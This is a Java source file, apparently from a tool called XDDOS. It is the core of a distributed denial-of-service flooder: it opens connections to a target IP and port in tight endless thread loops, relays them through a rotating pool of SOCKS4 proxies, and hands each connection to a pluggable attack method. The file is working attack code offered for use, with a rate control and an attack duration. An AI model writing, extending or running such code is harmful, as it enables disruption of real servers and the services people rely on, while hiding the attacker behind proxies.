package XD.XDDOS;

import XD.XDDOS.methods.Method;
import io.netty.bootstrap.Bootstrap;
import io.netty.channel.Channel;
import io.netty.channel.ChannelHandler;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.ChannelOption;
import io.netty.channel.EventLoopGroup;
import io.netty.channel.epoll.EpollEventLoopGroup;
import io.netty.channel.epoll.EpollSocketChannel;
import io.netty.handler.proxy.Socks4ProxyHandler;
import io.netty.util.ResourceLeakDetector;
import io.netty.util.concurrent.Future;
import io.netty.util.concurrent.GenericFutureListener;
import java.net.InetAddress;
import java.util.concurrent.ThreadFactory;

public class NettyBootstrap {

   public static final EventLoopGroup loopGroup;
   public static final Class<? extends Channel> socketChannel;
   public static final Method method;
   public static final ProxyLoader proxyLoader;
   public static final ChannelHandler channelHandler;
   public static final Bootstrap bootstrap;
   public static volatile int integer = 0;
   public static volatile int nettyThreads;
   public static volatile int triedCPS = 0;
   public static final boolean disableFailedProxies;
   public static volatile int totalConnections = 0;
   public static volatile int totalSeconds = 0;
   public static Thread attack;

   static {
      nettyThreads = XDDOS.nettyThreads;
      disableFailedProxies = true; 
      {
         socketChannel = EpollSocketChannel.class;
         loopGroup = new EpollEventLoopGroup(nettyThreads, new ThreadFactory() {
            public Thread newThread(Runnable r) {
               Thread t = new Thread(r);
               t.setDaemon(true);
               t.setPriority(10);
               return t;
            }
         });
      }

      method = XDDOS.METHOD;
      proxyLoader = XDDOS.proxies;
      channelHandler = new ChannelHandler() {
         public void handlerRemoved(ChannelHandlerContext arg0) throws Exception {
         }

         public void handlerAdded(ChannelHandlerContext arg0) throws Exception {
         }

         public void exceptionCaught(ChannelHandlerContext c, Throwable t) throws Exception {
            c.close();
         }
      };
      ChannelHandler handler = new ChannelInitializer<Channel>() {
         public void channelInactive(ChannelHandlerContext ctx) throws Exception {
            ctx.channel().close();
         }
         protected void initChannel(final Channel c) throws Exception {
            try {
               final ProxyLoader.Proxy proxy = NettyBootstrap.proxyLoader.getProxy();
               final Socks4ProxyHandler proxyHandler = new Socks4ProxyHandler(proxy.addrs);
               proxyHandler.setConnectTimeoutMillis(10000L);
               proxyHandler.connectFuture().addListener(new GenericFutureListener<Future<? super Channel>>() {
                  public void operationComplete(Future<? super Channel> f) throws Exception {
                     if (f.isSuccess() && proxyHandler.isConnected()) {
                        NettyBootstrap.method.accept(c, proxy);
                     } else {
                        if (NettyBootstrap.disableFailedProxies) {
                           NettyBootstrap.proxyLoader.disabledProxies.put(proxy, System.currentTimeMillis());
                        }

                        c.close();
                     }

                  }
               });
               c.pipeline().addFirst(proxyHandler).addLast(NettyBootstrap.channelHandler);
            } catch (Exception var4) {
               c.close();
            }

         }

         public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {
            ctx.close();
         }
      };
      bootstrap = (Bootstrap)((Bootstrap)((Bootstrap)((Bootstrap)((Bootstrap)(new Bootstrap()).channel(socketChannel)).group(loopGroup)).option(ChannelOption.TCP_NODELAY, true)).option(ChannelOption.AUTO_READ, false)).handler(handler);
   }
   
   public static void start() throws Throwable {
      ResourceLeakDetector.setEnabled(true);
      InetAddress ip = XDDOS.resolved;
      int port = XDDOS.port;

      Thread Counter = new Thread(() -> {
         XDDOS.attackIsRunning = true;
         if (XDDOS.duration < 1) {
            XDDOS.duration = 2147483647;
         }

         for(int i = 0; i < XDDOS.duration; ++i) {
            try {
               Thread.sleep(1000L);
            } catch (InterruptedException var2) {
            }
            System.out.println("Current Connections: " + integer + " Total Seconds: " + totalSeconds);
            ++totalSeconds;
            integer = 0;
            triedCPS = 0;
         }
         XDDOS.attackIsRunning = false;
         attack.stop();
      });
      Counter.setPriority(1);
      Counter.start();
      int k;
      if (XDDOS.targetCPS == -1) {
         for(k = 0; k < XDDOS.loopThreads; ++k) {
            attack = new Thread(() -> {
               while(true) {
                  ++triedCPS;
                  bootstrap.connect(ip, port);
               }
            });
            attack.start();
         }
      } else {
         for(k = 0; k < XDDOS.loopThreads; ++k) {
            attack = new Thread(() -> {
               while(true) {
                  for(int j = 0; j < XDDOS.targetCPS / XDDOS.loopThreads / 10; ++j) {
                     ++triedCPS;
                     bootstrap.connect(ip, port);
                  }
                  
                  try {
                     Thread.sleep(100L);
                  } catch (InterruptedException var3) {
                  }
               }
            });
            attack.start();
         }
      }


   }
}
